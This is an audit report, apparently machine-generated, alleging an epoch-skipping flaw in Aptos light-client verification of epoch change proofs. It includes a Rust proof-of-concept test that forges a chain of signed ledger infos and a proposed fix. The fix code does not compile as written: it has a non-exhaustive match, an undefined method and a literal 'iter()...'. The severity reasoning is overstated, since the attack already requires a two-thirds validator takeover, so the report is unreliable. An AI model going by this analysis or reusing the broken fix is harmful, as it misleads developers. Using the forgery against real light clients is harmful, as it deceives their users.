# Audit Report

## Title
Epoch Skipping Attack in Light Client Verification - Missing Epoch Continuity Check in EpochChangeProof

## Summary
The `EpochChangeProof::verify()` function in `types/src/epoch_change.rs` fails to validate that the `next_epoch_state.epoch` field is exactly `current_epoch + 1`, allowing malicious validators to skip arbitrary epochs and trick light clients into accepting fraudulent validator sets for future epochs.

## Finding Description

The vulnerability exists in the epoch change proof verification logic used by light clients to sync to the latest validator set. When verifying an epoch change proof, the system extracts the `next_epoch_state` from each verified ledger info and uses it as the verifier for the subsequent epoch without checking epoch continuity. [1](#0-0) 

The critical flaw is that after verifying a ledger info's signatures at line 107, the code blindly extracts the `next_epoch_state` at lines 111-114 and uses it as the new verifier. However, there is **no validation** that `next_epoch_state.epoch == current_epoch + 1`.

The `EpochState::verify()` function only checks that the verifier's epoch matches the ledger info's epoch: [2](#0-1) 

This check at lines 42-46 verifies `self.epoch == ledger_info.ledger_info().epoch()`, but does NOT validate the `next_epoch_state` embedded within the ledger info.

**Attack Scenario:**

1. Malicious validators control epoch 5
2. They create a valid epoch-change ledger info for epoch 5, but embed a malicious `next_epoch_state` claiming to be for epoch 100 (not epoch 6) with a validator set they control
3. They create another ledger info claiming to be from epoch 100, signed by their malicious validator set
4. They send an `EpochChangeProof` containing these two ledger infos to a light client

**Verification Process (bypassing security):**
- **Iteration 1**: Verifier at epoch 5
  - Check: `5 == ledger_info.epoch()` (5) ✓ Passes
  - Verify signatures using epoch 5 validators ✓ Passes
  - Extract `next_epoch_state{epoch: 100, verifier: MALICIOUS}`
  - New verifier = epoch 100
  
- **Iteration 2**: Verifier at epoch 100  
  - Check: `100 == ledger_info.epoch()` (100) ✓ Passes
  - Verify signatures using MALICIOUS validators ✓ Passes
  - Verification succeeds!

The light client now skips epochs 6-99 and trusts the attacker's validator set for epoch 100+, creating a fork in the light client's view of the blockchain.

Evidence of missing validation:
- No grep results found for code accessing `next_epoch_state().epoch` for validation
- Test suite always generates contiguous epochs (`epoch + 1`): [3](#0-2) 

This means the test suite would never catch non-contiguous epoch attacks.

## Impact Explanation

**Severity: HIGH** (significant protocol violation, potential consensus/safety violation for light clients)

This vulnerability allows malicious validators at epoch N to:
- Create an alternate blockchain reality for light clients
- Skip epochs N+1 through M-1 arbitrarily
- Install a fraudulent validator set for epoch M and beyond
- Show fake balances, transactions, and state to light clients
- Fork the light client's view without controlling actual intermediate epoch validators

This breaks the **Consensus Safety** invariant for light clients, as different light clients could be shown different states. While full nodes with complete epoch history would reject such proofs, light clients (mobile wallets, SPV clients) relying solely on epoch change proofs would be compromised.

The attack requires controlling validators at only ONE epoch, not requiring collusion across multiple epochs or 51% stake attacks. This makes it more feasible than traditional Byzantine attacks.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

Prerequisites for exploitation:
- Attacker controls ≥2/3 voting power in ANY single epoch (required to generate valid signatures)
- Ability to deliver malicious epoch change proofs to light clients (standard network capability)

The attack is realistic because:
1. Validators at epoch N can legitimately sign epoch-change ledger infos
2. Nothing prevents them from embedding an arbitrary `next_epoch_state` with incorrect epoch number
3. Light clients accept these proofs without epoch continuity validation
4. The attack requires compromising only one epoch's validator set, not sustained control

While requiring 2/3+ stake in an epoch is significant, this is within the threat model for Byzantine validators, and once achieved at ANY historical epoch, allows permanent light client compromise.

## Recommendation

Add epoch continuity validation in `EpochChangeProof::verify()`:

```rust
pub fn verify(&self, verifier: &dyn Verifier) -> Result<&LedgerInfoWithSignatures> {
    ensure!(
        !self.ledger_info_with_sigs.is_empty(),
        "The EpochChangeProof is empty"
    );
    // ... existing stale check ...
    
    let mut verifier_ref = verifier;
    let mut current_epoch = match verifier_ref {
        v if v.epoch_change_verification_required(0) => {
            // Extract epoch from verifier (EpochState or Waypoint)
            // This would need to be added to the Verifier trait
            v.get_epoch()
        }
    };

    for ledger_info_with_sigs in self.ledger_info_with_sigs.iter()... {
        verifier_ref.verify(ledger_info_with_sigs)?;
        
        let next_epoch_state = ledger_info_with_sigs
            .ledger_info()
            .next_epoch_state()
            .ok_or_else(|| format_err!("LedgerInfo doesn't carry a ValidatorSet"))?;
        
        // *** ADD THIS VALIDATION ***
        ensure!(
            next_epoch_state.epoch == ledger_info_with_sigs.ledger_info().epoch() + 1,
            "next_epoch_state must be for consecutive epoch {}, got {}",
            ledger_info_with_sigs.ledger_info().epoch() + 1,
            next_epoch_state.epoch
        );
        
        verifier_ref = next_epoch_state;
    }

    Ok(self.ledger_info_with_sigs.last().unwrap())
}
```

The fix ensures that each `next_epoch_state.epoch` equals `current_ledger_info.epoch() + 1`, preventing epoch-skipping attacks.

## Proof of Concept

```rust
#[test]
fn test_epoch_skipping_attack() {
    use crate::{
        epoch_change::EpochChangeProof,
        epoch_state::EpochState,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        block_info::BlockInfo,
        validator_verifier::random_validator_verifier,
        aggregate_signature::PartialSignatures,
    };
    use aptos_crypto::hash::HashValue;
    use std::sync::Arc;

    // Setup: Create validator sets for epoch 5 and malicious epoch 100
    let (epoch5_signers, epoch5_verifier) = random_validator_verifier(4, None, true);
    let epoch5_verifier = Arc::new(epoch5_verifier);
    
    let (malicious_signers, malicious_verifier) = random_validator_verifier(4, None, true);
    let malicious_verifier_arc = Arc::new(malicious_verifier);

    // Attacker creates epoch 5 ledger info with MALICIOUS next_epoch_state claiming epoch 100
    let malicious_next_epoch = EpochState {
        epoch: 100, // Should be 6, but attacker sets to 100!
        verifier: malicious_verifier_arc.clone(),
    };

    let li_epoch5 = LedgerInfo::new(
        BlockInfo::new(
            5, 0, HashValue::zero(), HashValue::zero(), 123, 0,
            Some(malicious_next_epoch), // Malicious next_epoch_state
        ),
        HashValue::zero(),
    );

    // Sign with legitimate epoch 5 validators
    let partial_sigs_5 = PartialSignatures::new(
        epoch5_signers.iter()
            .map(|s| (s.author(), s.sign(&li_epoch5).unwrap()))
            .collect(),
    );
    let sig5 = epoch5_verifier.aggregate_signatures(partial_sigs_5.signatures_iter()).unwrap();
    let li_with_sigs_5 = LedgerInfoWithSignatures::new(li_epoch5, sig5);

    // Attacker creates epoch 100 ledger info signed by malicious validators
    let li_epoch100 = LedgerInfo::new(
        BlockInfo::new(
            100, 0, HashValue::zero(), HashValue::zero(), 456, 0, None
        ),
        HashValue::zero(),
    );

    let partial_sigs_100 = PartialSignatures::new(
        malicious_signers.iter()
            .map(|s| (s.author(), s.sign(&li_epoch100).unwrap()))
            .collect(),
    );
    let sig100 = malicious_verifier_arc.aggregate_signatures(partial_sigs_100.signatures_iter()).unwrap();
    let li_with_sigs_100 = LedgerInfoWithSignatures::new(li_epoch100, sig100);

    // Create malicious epoch change proof skipping epochs 6-99
    let malicious_proof = EpochChangeProof::new(
        vec![li_with_sigs_5, li_with_sigs_100],
        false
    );

    let verifier = EpochState {
        epoch: 5,
        verifier: epoch5_verifier,
    };

    // VULNERABILITY: This verification SUCCEEDS when it should FAIL
    // Light client is tricked into skipping epochs 6-99
    let result = malicious_proof.verify(&verifier);
    
    // Currently this passes (vulnerability), but should fail with proper validation
    assert!(result.is_ok(), "VULNERABILITY: Epoch skipping attack succeeds!");
}
```

This PoC demonstrates that the current implementation accepts epoch change proofs that skip epochs, allowing light clients to be fooled into trusting malicious validator sets.

### Citations

**File:** types/src/epoch_change.rs (L106-115)
```rust
            // Try to verify each (epoch -> epoch + 1) jump in the EpochChangeProof.
            verifier_ref.verify(ledger_info_with_sigs)?;
            // While the original verification could've been via waypoints,
            // all the next epoch changes are verified using the (already
            // trusted) validator sets.
            verifier_ref = ledger_info_with_sigs
                .ledger_info()
                .next_epoch_state()
                .ok_or_else(|| format_err!("LedgerInfo doesn't carry a ValidatorSet"))?;
        }
```

**File:** types/src/epoch_state.rs (L41-49)
```rust
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> anyhow::Result<()> {
        ensure!(
            self.epoch == ledger_info.ledger_info().epoch(),
            "LedgerInfo has unexpected epoch {}, expected {}",
            ledger_info.ledger_info().epoch(),
            self.epoch
        );
        ledger_info.verify_signatures(&self.verifier)?;
        Ok(())
```

**File:** types/src/unit_tests/trusted_state_test.rs (L208-208)
```rust
                        let next_vset = into_epoch_state(epoch + 1, &next_vset.0);
```
